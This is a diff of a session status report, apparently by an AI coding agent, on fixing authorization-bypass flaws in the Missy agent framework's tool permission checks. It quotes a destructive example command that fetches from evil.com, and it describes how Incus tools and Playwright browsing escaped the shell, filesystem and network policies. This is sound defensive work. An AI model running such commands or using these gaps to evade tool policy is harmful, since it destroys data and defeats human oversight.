@@ -5,7 +5,7 @@ Date: 2026-07-10
 Branch: `overhaul/missy-validation-20260710-031406`
 Draft PR: https://github.com/MissyLabs/missy/pull/31
 
-## Changed (10 checkpoints this session, full suite green after every one)
+## Changed (12 checkpoints this session, full suite green after every one)
 
 1. Preserved/hardened the existing `voice_commands.py` fix; fixed a real
    trailing-comma leak bug the new regression tests caught.
@@ -43,7 +43,6 @@ Draft PR: https://github.com/MissyLabs/missy/pull/31
     but reverted after it broke ~136 existing tests (mocks target
     `subprocess.run`, the fix needed `subprocess.Popen`) — tracked as
     task #17 for a dedicated session.
-
 11. **SR-1.8**: found and fixed a fifth critical finding —
     `ShellPolicyEngine.check_command()` treated an empty
     `allowed_commands` list as allow-all whenever `shell.enabled: true`,
@@ -53,16 +52,32 @@ Draft PR: https://github.com/MissyLabs/missy/pull/31
     `rm -rf / && wget evil.com` passed policy under that exact default
     config. Fixed the implementation to match its own documented
     contract; no doc changes needed.
-12. Updated the four other required session artifacts
-    (`BUILD_RESULTS.md`, `TEST_EDGE_CASES.md`, `AUDIT_CONNECTIVITY.md`,
-    `OPENCLAW_GAP_ANALYSIS.md`) which hadn't been touched since the
-    prior tool-intelligence-overhaul session.
+12. **SR-1.6 groundwork / SR-1.5 (sixth critical finding)**: fixed the
+    review's "architectural finding" pattern for Incus tools —
+    `ToolRegistry._check_permissions()` derived the checked shell
+    command from a generic `command` kwarg that 14 of 15 Incus tools
+    don't have (checking the meaningless literal `"shell"` instead of
+    the real `incus` binary), and `incus_exec`'s `command` kwarg names
+    the *guest* command, not the host binary. Live-reproduced
+    end-to-end: with `allowed_commands=["bash"]`,
+    `incus_exec(command="bash")` passed policy and executed the real
+    host `incus exec ... -- bash -c bash`, despite `incus` never being
+    allowlisted. Also fixed: `incus_file`'s `host_path` was never
+    checked against the filesystem policy at all (declared `shell=True`
+    only). Fixed generally via two new optional `BaseTool` hooks
+    (`resolve_shell_command`, `resolve_filesystem_targets`) rather than
+    special-casing Incus — any first-party tool can now declare its real
+    operation instead of relying on a kwarg-name heuristic that several
+    tools' actual kwargs don't match. Verified zero behavior change for
+    tools that don't opt into the new hooks.
 
-**Five independent, confirmed critical authorization-bypass
+**Six independent, confirmed critical authorization-bypass
 vulnerabilities** found and fixed this session (SR-1.2/1.3, SR-1.12,
-SR-1.13 ×2, SR-1.8), all the same underlying pattern: an unauthenticated
-or unrestricted action reachable due to a fail-open default or missing
-gate. Plus the FX-A/B/C/D/F/G validation-harness root causes.
+SR-1.13 ×2, SR-1.8, SR-1.5), all variations on the same underlying
+pattern: an unauthenticated or unrestricted action reachable due to a
+fail-open default, a missing gate, or (SR-1.5's variant) declared tool
+metadata that doesn't match the operation actually performed. Plus the
+FX-A/B/C/D/F/G validation-harness root causes.
 
 **All of FX-A through FX-G are now done** per the prompt's stated
 dependency order (some with residual/deferred sub-items tracked as
@@ -75,7 +90,7 @@ python3 -m pytest tests/ -q -o faulthandler_timeout=120 \
   --deselect tests/vision/test_discovery_capture_sysfs.py::TestCacheTTL::test_cache_valid_within_ttl \
   --deselect tests/vision/test_discovery_edge_cases.py::TestPermissionDeniedOnDevice::test_device_that_does_not_exist_is_skipped \
   --deselect tests/vision/test_discovery_edge_cases.py::TestRapidAddRemove::test_cached_results_returned_within_ttl
-20755 passed, 13 skipped, 3 deselected in 460.03s (0:07:40)
+20770 passed, 13 skipped, 3 deselected in 448.20s (0:07:28)
 ```
 
 Full detail in `BUILD_STATUS.md`, `AUDIT_SECURITY.md`, and
@@ -85,9 +100,13 @@ session, oldest at the bottom, nothing overwritten.
 ## Open tasks (session-tracked, carry into next session)
 
 - **#9** SR-1.x through SR-4.x security review remediation — most of
-  it. This session covered SR-1.2/1.3, SR-1.12, SR-1.13 only (plus SR-3.1
-  substantially via FX-B). SR-1.1, SR-1.4 through SR-1.11, SR-2.x,
-  SR-3.2 through SR-3.5, SR-4.x remain.
+  it. This session covered SR-1.2/1.3, SR-1.5, SR-1.8, SR-1.12, SR-1.13
+  (plus SR-3.1 substantially via FX-B). SR-1.1, SR-1.4, SR-1.6 through
+  SR-1.11, SR-2.x, SR-3.2 through SR-3.5, SR-4.x remain. Note: SR-1.5's
+  fix added a general per-tool permission-resolution mechanism
+  (`BaseTool.resolve_shell_command`/`resolve_filesystem_targets`) that
+  SR-1.4 (the same heuristic gap in other tools, e.g. `vision_capture`)
+  can reuse directly rather than needing its own design.
 - **#10** Full 89-case tool-specific validation backlog — not yet
   re-run against current code.
 - **#11** Pre-existing vision `CameraDiscovery` cache-TTL flake (3
@@ -107,6 +126,13 @@ session, oldest at the bottom, nothing overwritten.
   works but needs the test-suite migration from mocking
   `subprocess.run` to `subprocess.Popen` done carefully in its own
   session.
+- **New this checkpoint:** SR-1.4 (same declaration/dispatch mismatch
+  pattern in `vision_capture`'s `source`/`save_path` kwargs and any
+  other first-party tool using nonstandard kwarg names) and SR-1.6
+  (Playwright browser navigation bypasses `PolicyHTTPClient`/the
+  network gateway entirely — a different, non-shell mechanism) remain
+  open and are the natural next candidates given the pattern established
+  by SR-1.5.
 
 ## The single biggest remaining gap
 
@@ -125,8 +151,11 @@ rather than code-level reasoning about what *should* happen.
 
 If a way to safely exercise a real or scripted acpx delegate call
 becomes available, prioritize FX-A bullet 6 — it unblocks re-validating
-everything else. Otherwise, continue the SR-1.x security sweep (SR-1.5
-Incus policy composition, SR-1.6 browser network enforcement are the
-strongest remaining candidates given four confirmed findings already)
-or pick up one of the concrete scoped tasks above (#11, #12, #15, #16,
+everything else. Otherwise, continue the SR-1.x security sweep — SR-1.6
+(Playwright bypassing the network gateway) is the strongest remaining
+candidate: it's a crown-jewel bypass ("no outbound unless whitelisted"
+being the product's core claim) and, unlike SR-1.5, requires a genuinely
+different mechanism (the tool calls Playwright directly instead of
+`PolicyHTTPClient`), so it can't reuse the resolve_* hooks alone — or
+pick up one of the concrete scoped tasks above (#11, #12, #15, #16,
 #17) — all are self-contained and don't require a live delegate.
